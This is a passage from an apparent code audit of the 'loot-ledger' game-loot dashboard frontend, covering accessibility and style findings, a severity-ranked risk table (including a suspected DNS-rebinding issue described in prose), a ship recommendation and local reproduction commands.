5. **The live capture path was never exercised** — no `CAP_NET_RAW` and no game traffic. All server evidence comes from journal replay under `--no-capture`. Any conclusion about what the *game* actually puts in `name`/`guild`/`alliance` is inference from `src/game/events.rs` and `src/proto/*`, not observation.
6. **Whether `looted_from` can be empty in live capture** (C4) is unresolved. `src/game/events.rs:82-85` falls back to `looted_by`, so it reduces to "can `looted_by` be empty", which I did not chase.
7. **`isDuplicate` drops genuine events.** `app.js:450-464` compares six fields and only the newest row, and the comment at `app.js:444-449` concedes that two genuinely distinct grabs in the same millisecond with the same by/from/qty/silver/itemNumId are collapsed. Documented and deliberate, but the *frequency* is unmeasured. In a mass-loot fight this is the most likely source of the user noticing a missing row.
8. **The `roster` count discrepancy in C3** was observed but its cause was not isolated — it is a name collision in `players` or a server/client difference in how a `looted_from` victim is counted. The observation stands regardless.
9. **No tests exist for the frontend.** `tests/` contains `golden_vectors.rs` and `http.rs` only. The shim in §.audit-scratch is a 200-line proof of concept, not a test suite; nothing in the repository would catch a regression to C1 or C2 tomorrow. Given that the whole client is three dependency-free files, a shim-based harness is genuinely feasible and would be the highest-value addition to this project after the two fixes above.

---

## 6. Style opinions — clearly not defects

Flagged as opinion because the repository has no stated design brief and I will not invent one.

- **D1 [P3] — 11 of 45 declared tokens are never referenced:** `--p-g-30`, `--text-on-fill`, `--accent-bright`, `--accent-fill`, `--accent-on-fill`, `--status-ok-fill`, `--status-ok-ink`, `--status-warn-fill`, `--status-warn-ink`, `--status-crit-fill`, `--status-crit-ink`. The two-tier architecture at `style.css:4-9` is good and the role tier is correctly the only one referenced below line 90. But a contributor reaching for `--accent-fill` or `--status-crit-fill` will find a token that was never validated against any surface, in a file whose header claims every ramp was measured. Delete them or use them.
- **D2 [P3] — "Gold means 'you' and nothing else" is false, and the code says so against itself.** `style.css:37` asserts the invariant; `var(--accent)` is then used at **`style.css:278`** (`.brand-mark`, the logo — decorative), **`560`** (`.you` — "you"), **`569`** (the self row's 3 px bar — "you"), **`573`** (the self row's `.pname` — "you"), and **`669`** (`.coverage-tag`, the word "Coverage" — neither). That is five references and three meanings. This is the prior pass's one demonstrably false claim. The fix is a one-line comment correction at minimum, but the honest answer is that gold means "this is yours / this is us", and the comment should say that. The "you" cue itself is excellent and correctly never relies on colour alone (`style.css:567` pairs the bar with the word chip, and `style.css:549-565` is a real text element, not a pseudo-element).
- **D3 [P3] — `--fs-xs` is 11px** and is used for four label styles including the `.you` chip (`style.css:138, 392, 488, 555, 665, 697`). At 650 weight and `letter-spacing: 0.06em` it is legible, and its contrast is fine at 8.73/5.82. WCAG sets no minimum size. I would still nudge the two 11px-uppercase labels that carry real information — `.stat-sub` is 12px, `.panel-meta` is 12px — to 12px minimum. Opinion.
- **A2 [P3] — the skip-link target is not focusable.** `index.html:14` targets `#feed-region`, a `<section>` at `index.html:105` with no `tabindex="-1"`. Modern browsers do move the sequential focus starting point, so it works in practice; adding `tabindex="-1"` makes it reliable everywhere. The skip link is otherwise unusually well done: it exists in the markup (`index.html:14`), is visible only on `:focus` (`style.css:207-223`), is the first focusable element, and is properly announced.
- **A3 [P3] — the skip link can focus off-screen.** `.skip-link` is `position: absolute` and no ancestor sets `position`, so its containing block is the initial containing block. At ≥64rem `.app` is `overflow: hidden; block-size: 100dvh` so the page cannot scroll and this is moot; below 64rem the page *does* scroll, and a skip link focused after a scroll renders at document coordinates (8, 8), off-screen. WCAG 2.4.11. Fix: `position: fixed` on `.skip-link`.
- **A4 [P3] — `title` as the only disambiguation for "Qty".** `index.html:123` puts `"Silver amount, or item count"` in a `title`, which is unreliable across screen readers and unreachable by keyboard. The unknown-item `title` at `app.js:402-405` is fine because the cell text already says `Item #NNNN`, which is a self-describing fallback. The Qty column has no such fallback.
- **A6 [P3] — two polite live regions.** `#conn` (`index.html:46`) and `#announce` (`index.html:259`) are both polite. During a reconnect plus a loot burst, some screen readers announce only the first. Consider `aria-live="assertive"` on `#conn`, or accept it — the dot-plus-word design at `style.css:289-332` is otherwise a model of "never colour alone".
- **A7 [P3] — `.c-from` is ellipsised with no `title`.** `style.css:527-533` clips a long victim name with `text-overflow: ellipsis` and offers no recovery for a sighted user; the full name *is* in the accessibility tree, so this is not a WCAG issue. The same column is `display: none` below 44rem while the filter still matches against it (`app.js:415-416`), so on a phone a filter match can surface a row whose "from" is invisible — mildly confusing rather than wrong.
- **L1 [P3] — no `min-block-size` guard on the ≥64rem layout.** `style.css:735-744` sets `block-size: 100dvh; overflow: hidden` with `minmax(0, 1fr)` for the panes, so on a short-and-wide window (≥1024 px wide, ≤~400 px tall) the feed and roster panes collapse toward zero height rather than the page scrolling. Uncommon but reachable with a short browser window. Reasoned-from-source; unrendered.
- **A5 [P3] — forced-colors loses the `.stats` tile grid.** `style.css:369-377` draws the 1 px separators with `background: var(--border-subtle)` and `gap: 1px`; forced-colors overrides background to `Canvas`, so the separators disappear. Borders are forced to `CanvasText` and survive, so switching to a real `border` would fix it. The rest of the `forced-colors` block (`style.css:831-854`) is thorough — including `forced-color-adjust: none` on the connection dot so its state stays visible, which is a considered choice rather than a reflex.

### What to leave alone

Named explicitly, because a review that only lists problems misrepresents the codebase. Do not touch: the two-tier token architecture (`style.css:4-9`) and the single role-tier block; the `EventSource`-owns-the-reconnect design and the comment that says so (`app.js:6-9`); the never-parse-markup discipline (`app.js:15-16`), which is the single most valuable thing in this codebase; the one-`<tr>`-at-a-time update strategy (`app.js:11-13`); the `createTextNode(' ')` before the "you" chip (`app.js:347`, explained at `app.js:338-341`) — that is a better piece of accessibility engineering than most shipped dashboards manage; the `[hidden] { display: none !important }` rule at `style.css:177-179`, which correctly defuses the classic `tr[hidden]` override bug and is easy to delete by accident; `border-collapse: separate` with sticky headers and the comment explaining why (`style.css:471-472`); the `prefers-color-scheme` block being a re-measurement rather than a mechanical inversion (`style.css:59-60`); the `sawTraffic`-driven empty-state distinction, which is a genuinely thoughtful bit of state modelling; and the footer's honest statement of coverage limits (`index.html:176-183`), which is better product writing than most tools ship.

---

## 7. Top risks by severity

| # | Sev | Finding | One-line risk |
|---|---|---|---|
| 1 | **P1** | **S1** — no `Host` validation → DNS rebinding *(suspected; server-side)* | A website the user visits can read every player name in their session |
| 2 | **P2** | **C1** — "Latest:" announces the first event of a burst | The only screen-reader channel states the wrong thing exactly when it matters most |
| 3 | **P2** | **C2** — roster reports 620, shows 500, silently truncates | The tool's core task is silently incomplete with no on-screen signal |
| 4 | **P2** | **A1** — ≤26rem drops the feed timestamp, against its own comment | Mobile users lose "when" with no fallback; next maintainer trusts the comment |
| 5 | **P2** | **S2/S3** — no CSP, no `frame-ancestors`, no `nosniff` | No safety net under a client that is one careless commit away from a regression |
| 6 | **P2** | **S4** — any local process reads the port, and the UI never says so | Real-name exposure that the product copy implies is private |
| 7 | **P3** | **C5** — "capture stopped" is unreachable | Says "reconnecting…" about a process that is exiting |
| 8 | **P3** | **C3/C4** — stat tile ≠ panel header; "…from ." | Two wrong numbers/copy strings a user can hit in one sitting |
| 9 | **P3** | **C7/C8** — error message clobbered by fallback; reconnect rewinds the feed | A transient 6-second wrong state; a blip silently rewinds the view |
| 10 | **P3** | **D2** — "gold means 'you' and nothing else" is false | A false invariant in a comment is worse than no comment |
| 11 | **P3** | **A2/A3/A4/A6/A7, L1, C6/C9/C10, F1, D1/D3, A5** | Individually cosmetic; collectively the polish backlog |

**No P0.** There is no untrusted-data-into-DOM defect, no crash, no data loss, no path to a broken core task, and no unauthenticated *write* surface — the server rejects every method but `GET`/`HEAD` (`src/web/mod.rs:230-232`).

---

## 8. Is this UI ready to ship? — brutally honestly

**Yes. Ship it.** And I say that having tried to break it, because I put a hostile journal through the whole stack and executed the real client against the live server, and the thing held.

The case for shipping is not "there are no serious findings". It is that the failure modes that matter for this product are absent, and the ones that remain are all *disclosure* failures rather than *integrity* failures:

- **The XSS question is settled, empirically.** Hostile names, guilds and items reached the DOM as text, proven by node type, not by reading. For a tool whose entire input surface is a hostile game server, that is the finding that had to be true, and it is.
- **The stream design is right and the comments explain why.** Handing reconnection to `EventSource` instead of writing a reconnect loop, and keeping the client purely a function of a server snapshot, means the two hard classes of live-feed bug simply do not exist here. Most hand-rolled dashboards get this wrong.
- **The accessibility work is above the bar for the category,** and it is above the bar in the places that show someone actually thought: the region exists before its text changes (`index.html:254-258`), the chip separator is a real text node so the accessible name reads "Grim you" (`app.js:338-341`), no cue is colour-alone anywhere, `[hidden]` is defended, and the contrast actually was measured — and where I could not reproduce the prior pass's *number*, the *result* was better than claimed.

The case against is narrow and I would not let it block a release:

- **C2 is the one I would not ship around.** A dashboard that says "620 players" over 500 rows, with a caption promising "every player seen", is quietly lying about the completeness of the tool's primary output. It is a one-line fix because the feed already does the right thing at `app.js:690-693` and the roster should copy it.
- **C1 is the one that would bother me if a friend shipped it.** The live region is the only channel a screen-reader user has, and during a burst it confidently mislabels the oldest event in the window as the newest. It is a one-line fix and it is a correctness bug, not a taste question.
- **A1 is a contradiction, not a judgement call,** and contradictions in a comment outlive the judgement they encode.
- **S1 is above my pay grade for this brief** and belongs to whoever owns the HTTP server. It is a three-line `Host` allowlist, and until it exists I would not put this tool on a machine where the local-user threat model in the brief is real.

**What I would not do:** I would not commission a redesign, would not add a framework, would not add a build step, and would not touch the token architecture. Those are the parts that are working, and the honest summary of this audit is that *the thing I'd change is three bug fixes and two comments, and the rest of the file should be left exactly as it is.*

**And if I had one more week:** the highest-value addition is not a fix, it is a 200-line test harness like the shim I already wrote, wired into `tests/`. This codebase has golden vectors for the protocol decoder and integration tests for the HTTP layer, and **zero** for the client — so today, a one-line change to `queueAnnouncement` could silently reintroduce C1 and nothing would notice. The frontend is the only part of this project with no regression net at all, and that is a bigger long-term risk than any single finding in §4.

---

### Reproduction

The evidence in this report is reproducible from the project root. Scratch files live outside the repository, in `/mnt/data/Project/Albion_stuff/.audit-scratch/`:

| File | What it does |
|---|---|
| `make-journal.mjs` | Writes a 967-line hostile+volume journal (10 hostile players, 3 zone markers, 350 loot rows, 600 filler players) |
| `probe.mjs`, `probe2.mjs` | Query the live `/api/snapshot`; assert field presence, feed/zones ordering, and byte-for-byte survival of every hostile string |
| `contrast.mjs` | Parses the `:root` token graph from `style.css` for both themes, resolves aliases, measures the 40 real pairings, and reports the 11 dead tokens |
| `dom.mjs` | The minimal DOM shim (tree, `textContent`, `dataset`, `classList`, `hidden`, `isConnected`, serialiser that escapes on output) |
| `domcheck.mjs`, `domcheck2.mjs` | Run the **unmodified** `app.js` in the shim, driven by real SSE frames, and assert the results quoted in §3, §4 and §5 |

```bash
cd /mnt/data/Project/Albion_stuff/.audit-scratch
node make-journal.mjs journal.jsonl
cd /mnt/data/Project/Albion_stuff/loot-ledger
./target/release/loot-ledger --no-capture \
    --journal /mnt/data/Project/Albion_stuff/.audit-scratch/journal.jsonl \
    --port 7399 --no-open &
cd /mnt/data/Project/Albion_stuff/.audit-scratch && node probe.mjs && node probe2.mjs \
  && node contrast.mjs && node domcheck.mjs && node domcheck2.mjs
```

`node --check src/web/assets/app.js` passes before and after this pass. No file in `src/web/`, `src/**/*.rs` or `Cargo.toml` was modified.
